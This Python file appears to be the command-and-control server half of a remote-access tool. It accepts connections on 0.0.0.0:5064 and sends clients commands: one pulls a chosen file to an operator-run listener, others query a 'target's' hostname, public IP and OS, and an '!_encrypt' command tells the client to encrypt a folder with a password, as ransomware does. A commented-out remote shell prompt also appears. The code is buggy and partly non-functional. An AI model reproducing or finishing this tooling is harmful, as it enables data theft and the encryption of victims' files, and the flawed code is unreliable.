## New Server Code

## Order: start socket, bind to address, and listen for connections. Each new
#connection needs to be in its own thread

import subprocess as sp
import socket
import threading
import time


#import imports
import Modules.Linux.linux_info
import Modules.Windows.windows_info


HEADER = 64
FORMAT = 'utf-8'


class s_sock:
    
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        
        self.server.listen()  
        
        ## threading for clients
        while True:
            self.start_server.conn, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(self, self.start_server.conn, self.ADDR))
            thread.start()
            return True
        
    
    def handle_client(self, conn, addr):
        print(f"New Connection from {addr}")
        ## connection stuff... all needs to be redone
        
        ## Context manager for socket
        #with self.server as s:
            
        self.connected = True
        while self.connected: 
            try:
                #user_input = input("[SHELL]:")
                #self.send_msg(self, user_input)
                    
                ## Knocks CPU usage on disconnect
                time.sleep(0.001)

            except:
                conn.close()
                print(f"{addr} DISCONNECTED")
                self.connected = False
                return self.connected
            
            if self.connected == False:
                conn.close()
                print(f"{addr} DISCONNECTED")
                self.connected = False
                return self.connected

                
    
    
    def send_msg(self, message):
        
        self.start_server.conn.send(message.encode())
        recieve_msg = self.start_server.conn.recv(1024).decode() ## was 10000
        
        if recieve_msg == None:
            self.conected = False
        
        #print("HI")  
          ## why are you still encoded
        recieve_msg = str(recieve_msg)
        #print(recieve_msg) 
        return recieve_msg
    
    
    def file_download(self, message): ## << message is the same as file in this case
        import filetransfer_server as fts
        
        lst = []
        
        for i in message.split():
            lst.append(i)
            
        print(lst)
        
        LISTEN_IP = lst[0]
        LISTEN_PORT = lst[1]
        SAVE_FILEPATH = lst[2]
        FILE_TO_GET = lst[3]
            
        
        #LISTEN_IP = "0.0.0.0"
        #LISTEN_PORT = 5000
        #SAVE_FILEPATH = file
        
        ## sending details TO THE LISTEN SERVER
        ## needs to be in a thread to not block the lower from running
        
        server_recieve = threading.Thread(target=fts.s_recieve_file, args=(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH))
        server_recieve.start()
        
        #fts.s_recieve_file(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH)
        
        ## Sending TO THE CLIENT
        message = f"!_get {LISTEN_IP} {LISTEN_PORT} {FILE_TO_GET}" 
        self.start_server.conn.send(message.encode()) ## sending to client to send the file
        return True

    def get_os(self):
        message = "!_os-name"
        self.start_server.conn.send(message.encode())
        os_name_recieve = self.start_server.conn.recv(10000).decode()
        return os_name_recieve

    

class s_action:
    
    def c_get_hostname(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.hostname())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.hostname())
    
    def c_pub_ip(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.pub_ip())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.pub_ip())
            
    
    def c_os(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.os())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.os())

    
    def encryptor(folder, extension, password):
        s_sock.send_msg(s_sock, f"!_encrypt {folder} {extension} {password}")


if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    s_sock.start_server(s_sock,'0.0.0.0',5064)
